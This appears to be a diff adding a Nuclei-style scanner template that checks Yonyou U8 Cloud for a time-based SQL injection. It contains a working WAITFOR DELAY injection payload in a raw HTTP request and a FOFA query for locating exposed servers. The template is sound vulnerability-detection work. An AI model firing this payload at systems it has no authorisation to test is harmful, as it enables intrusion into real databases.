@@ -1,0 +1,31 @@
+id: yonyou-u8-cloud-MeasureQueryByToolAction-sqli
+info:
+  name: 用友 U8 Cloud MeasureQueryByToolAction - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://wiki.wy876.cn/#/%E7%94%A8%E5%8F%8BU8cloud%E6%8E%A5%E5%8F%A3MeasureQueryByToolAction%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E
+  metadata:
+    verified: true
+    fofa-query: app="用友-U8-Cloud" || title=="U8C"
+  tags: yonyou,sqli,u8cloud,oa,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQueryByToolAction&method=execute&query_id=1%27);WAITFOR+DELAY+%270:0:6%27--+ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: application/json
+        Accept-Encoding: gzip
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+          - contains(body,'yonyoucloud')
+          - status_code == 200
+        condition: and
